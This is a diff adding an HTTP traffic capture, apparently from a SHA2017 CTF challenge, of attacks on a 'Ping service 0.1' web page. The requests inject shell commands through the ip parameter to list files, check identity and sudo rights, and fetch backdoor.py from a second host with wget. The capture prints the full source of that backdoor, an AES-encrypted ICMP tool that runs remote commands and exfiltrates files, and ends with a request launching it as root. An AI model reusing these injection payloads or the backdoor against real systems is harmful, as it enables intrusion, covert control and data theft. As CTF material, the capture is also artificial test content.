@@ -1,0 +1,669 @@
+GET / HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+0
+
+GET /css/style.css HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.29.0.1/
+Connection: keep-alive
+If-Modified-Since: Wed, 26 Jul 2017 16:37:11 GMT
+If-None-Match: "5978c537-2314"
+
+HTTP/1.1 304 Not Modified
+Server: nginx/1.10.3 (Ubuntu)
+Date: Wed, 26 Jul 2017 16:42:41 GMT
+Last-Modified: Wed, 26 Jul 2017 16:37:11 GMT
+Connection: keep-alive
+ETag: "5978c537-2314"
+
+GET /?ip=google.com HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.29.0.1/
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Wed, 26 Jul 2017 16:42:48 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+660
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Ping service 0.1</title>
+  <meta name="description" content="Ping service 0.1">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="o-header">
+  <div class="o-container">
+    <h1 class="o-header__title">Ping service 0.1</h1>
+  </div>
+</header>
+
+<main class="o-main">
+  <div class="o-container">
+
+    <div class="o-section">
+      <div id="tabs" class="c-tabs no-js">
+        <div class="c-tabs-nav">
+          <a href="#" class="c-tabs-nav__link is-active">
+            <span>Ping System</span>
+          </a>
+        </div>
+        <div class="c-tab">
+          <div class="c-tab__content">
+            <h2>Ping system</h2>
+            <p>
+                <pre>PING google.com (172.217.17.110) 56(84) bytes of data.
+64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=9.12 ms
+64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=8.86 ms
+64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.3 ms
+64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.06 ms
+
+--- google.com ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3006ms
+rtt min/avg/max/mdev = 8.062/9.094/10.332/0.819 ms
+</pre>            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer class="o-footer">
+  <div class="o-container">
+    <small>&copy; 2017, SHA2017 CTF</small>
+  </div>
+</footer>
+
+</body>
+</html>
+
+0
+
+GET /?ip=google.com;ls HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Wed, 26 Jul 2017 16:42:55 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+66a
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Ping service 0.1</title>
+  <meta name="description" content="Ping service 0.1">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="o-header">
+  <div class="o-container">
+    <h1 class="o-header__title">Ping service 0.1</h1>
+  </div>
+</header>
+
+<main class="o-main">
+  <div class="o-container">
+
+    <div class="o-section">
+      <div id="tabs" class="c-tabs no-js">
+        <div class="c-tabs-nav">
+          <a href="#" class="c-tabs-nav__link is-active">
+            <span>Ping System</span>
+          </a>
+        </div>
+        <div class="c-tab">
+          <div class="c-tab__content">
+            <h2>Ping system</h2>
+            <p>
+                <pre>PING google.com (172.217.17.110) 56(84) bytes of data.
+64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=8.66 ms
+64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=9.44 ms
+64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.0 ms
+64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.44 ms
+
+--- google.com ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+rtt min/avg/max/mdev = 8.445/9.153/10.057/0.639 ms
+css
+index.php
+</pre>            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer class="o-footer">
+  <div class="o-container">
+    <small>&copy; 2017, SHA2017 CTF</small>
+  </div>
+</footer>
+
+</body>
+</html>
+
+0
+
+GET /?ip=;ls%20-la HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Wed, 26 Jul 2017 16:43:03 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+50b
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Ping service 0.1</title>
+  <meta name="description" content="Ping service 0.1">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="o-header">
+  <div class="o-container">
+    <h1 class="o-header__title">Ping service 0.1</h1>
+  </div>
+</header>
+
+<main class="o-main">
+  <div class="o-container">
+
+    <div class="o-section">
+      <div id="tabs" class="c-tabs no-js">
+        <div class="c-tabs-nav">
+          <a href="#" class="c-tabs-nav__link is-active">
+            <span>Ping System</span>
+          </a>
+        </div>
+        <div class="c-tab">
+          <div class="c-tab__content">
+            <h2>Ping system</h2>
+            <p>
+                <pre>total 16
+drwxr-xr-x 3 root     root     4096 Jul 26 09:36 .
+drwxr-xr-x 3 root     root     4096 Jul 26 03:45 ..
+drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css
+-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.php
+</pre>            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer class="o-footer">
+  <div class="o-container">
+    <small>&copy; 2017, SHA2017 CTF</small>
+  </div>
+</footer>
+
+</body>
+</html>
+
+0
+
+GET /?ip=;id HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Wed, 26 Jul 2017 16:43:11 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+461
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Ping service 0.1</title>
+  <meta name="description" content="Ping service 0.1">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="o-header">
+  <div class="o-container">
+    <h1 class="o-header__title">Ping service 0.1</h1>
+  </div>
+</header>
+
+<main class="o-main">
+  <div class="o-container">
+
+    <div class="o-section">
+      <div id="tabs" class="c-tabs no-js">
+        <div class="c-tabs-nav">
+          <a href="#" class="c-tabs-nav__link is-active">
+            <span>Ping System</span>
+          </a>
+        </div>
+        <div class="c-tab">
+          <div class="c-tab__content">
+            <h2>Ping system</h2>
+            <p>
+                <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer class="o-footer">
+  <div class="o-container">
+    <small>&copy; 2017, SHA2017 CTF</small>
+  </div>
+</footer>
+
+</body>
+</html>
+
+0
+
+GET /?ip=;sudo%20-l HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Wed, 26 Jul 2017 16:43:16 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+52a
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Ping service 0.1</title>
+  <meta name="description" content="Ping service 0.1">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="o-header">
+  <div class="o-container">
+    <h1 class="o-header__title">Ping service 0.1</h1>
+  </div>
+</header>
+
+<main class="o-main">
+  <div class="o-container">
+
+    <div class="o-section">
+      <div id="tabs" class="c-tabs no-js">
+        <div class="c-tabs-nav">
+          <a href="#" class="c-tabs-nav__link is-active">
+            <span>Ping System</span>
+          </a>
+        </div>
+        <div class="c-tab">
+          <div class="c-tab__content">
+            <h2>Ping system</h2>
+            <p>
+                <pre>Matching Defaults entries for www-data on router:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on router:
+    (ALL : ALL) NOPASSWD: ALL
+</pre>            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer class="o-footer">
+  <div class="o-container">
+    <small>&copy; 2017, SHA2017 CTF</small>
+  </div>
+</footer>
+
+</body>
+</html>
+
+0
+
+GET /css/style.css HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.29.0.1/?ip=;sudo%20-l
+Connection: keep-alive
+If-Modified-Since: Wed, 26 Jul 2017 16:37:11 GMT
+If-None-Match: "5978c537-2314"
+
+HTTP/1.1 304 Not Modified
+Server: nginx/1.10.3 (Ubuntu)
+Date: Wed, 26 Jul 2017 16:43:16 GMT
+Last-Modified: Wed, 26 Jul 2017 16:37:11 GMT
+Connection: keep-alive
+ETag: "5978c537-2314"
+
+GET /?ip=%3Bwget%20http://10.5.5.207/backdoor.py%20-O%20/tmp/backdoor.py HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Wed, 26 Jul 2017 16:43:36 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+592
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Ping service 0.1</title>
+  <meta name="description" content="Ping service 0.1">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="o-header">
+  <div class="o-container">
+    <h1 class="o-header__title">Ping service 0.1</h1>
+  </div>
+</header>
+
+<main class="o-main">
+  <div class="o-container">
+
+    <div class="o-section">
+      <div id="tabs" class="c-tabs no-js">
+        <div class="c-tabs-nav">
+          <a href="#" class="c-tabs-nav__link is-active">
+            <span>Ping System</span>
+          </a>
+        </div>
+        <div class="c-tab">
+          <div class="c-tab__content">
+            <h2>Ping system</h2>
+            <p>
+                <pre>--2017-07-26 09:43:36--  http://10.5.5.207/backdoor.py
+Connecting to 10.5.5.207:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2428 (2.4K) [text/x-python]
+Saving to: '/tmp/backdoor.py'
+
+     0K ..                                                    100%  458M=0s
+
+2017-07-26 09:43:36 (458 MB/s) - '/tmp/backdoor.py' saved [2428/2428]
+
+</pre>            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer class="o-footer">
+  <div class="o-container">
+    <small>&copy; 2017, SHA2017 CTF</small>
+  </div>
+</footer>
+
+</body>
+</html>
+
+0
+
+GET /?ip=%3Bcat%20/tmp/backdoor.py HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3 (Ubuntu)
+Date: Wed, 26 Jul 2017 16:43:47 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+da7
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Ping service 0.1</title>
+  <meta name="description" content="Ping service 0.1">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="o-header">
+  <div class="o-container">
+    <h1 class="o-header__title">Ping service 0.1</h1>
+  </div>
+</header>
+
+<main class="o-main">
+  <div class="o-container">
+
+    <div class="o-section">
+      <div id="tabs" class="c-tabs no-js">
+        <div class="c-tabs-nav">
+          <a href="#" class="c-tabs-nav__link is-active">
+            <span>Ping System</span>
+          </a>
+        </div>
+        <div class="c-tab">
+          <div class="c-tab__content">
+            <h2>Ping system</h2>
+            <p>
+                <pre>#!/usr/bin/env python
+
+import base64
+import sys
+import time
+import subprocess
+import threading
+
+from Crypto import Random
+from Crypto.Cipher import AES
+from scapy.all import *
+
+BS = 16
+pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
+unpad = lambda s : s[0:-ord(s[-1])]
+magic = "SHA2017"
+
+
+class AESCipher:
+
+    def __init__( self, key ):
+        self.key = key
+
+    def encrypt( self, raw ):
+        raw = pad(raw)
+        iv = Random.new().read( AES.block_size )
+        cipher = AES.new( self.key, AES.MODE_CBC, iv )
+        return base64.b64encode( iv + cipher.encrypt( raw ) )
+
+    def decrypt( self, enc ):
+        enc = base64.b64decode(enc)
+        iv = enc[:16]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv )
+        return unpad(cipher.decrypt( enc[16:] ))
+
+def run_command(cmd):
+    ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+    output = ps.communicate()[0]
+    return output
+
+def send_ping(host, magic, data):
+    data = cipher.encrypt(data)
+    load = "{}:{}".format(magic, data)
+    time.sleep(1)
+    sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)
+
+def chunks(L, n):
+    for i in xrange(0, len(L), n):
+        yield L[i:i+n]
+
+def get_file(host, magic, fn):
+    time.sleep(1)
+    data = base64.urlsafe_b64encode(open(fn, "rb").read())
+    cnt = 0
+    icmp_threads = []
+    for line in chunks(data, 500):
+        t = threading.Thread(target = send_ping, args = (host,magic, "getfile:{}:{}".format(cnt,line)))
+        t.daemon = True
+        t.start()
+        icmp_threads.append(t)
+        cnt += 1
+
+    for t in icmp_threads:
+        t.join()
+
+
+cipher = AESCipher(sys.argv[1])
+
+while True:
+    try: 
+        pkts = sniff(filter="icmp", timeout =5,count=1)
+
+        for packet in pkts:
+             if  str(packet.getlayer(ICMP).type) == "8": 
+                input = packet[IP].load
+                if input[0:len(magic)] == magic:
+                    input = input.split(":")
+                    data = cipher.decrypt(input[1]).split(":")
+                    ip = packet[IP].src
+                    if data[0] == "command":
+                        output = run_command(data[1])
+                        send_ping(ip, magic, "command:{}".format(output))
+                    if data[0] == "getfile":
+                        #print "[+] Sending file {}".format(data[1])
+                        get_file(ip, magic, data[1])
+    except:
+        pass
+
+</pre>            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer class="o-footer">
+  <div class="o-container">
+    <small>&copy; 2017, SHA2017 CTF</small>
+  </div>
+</footer>
+
+</body>
+</html>
+
+0
+
+GET /?ip=%3Bnohup%20sudo%20python%20/tmp/backdoor.py%20K8djhaIU8H2d1jNb%20\& HTTP/1.1
+Host: 10.29.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
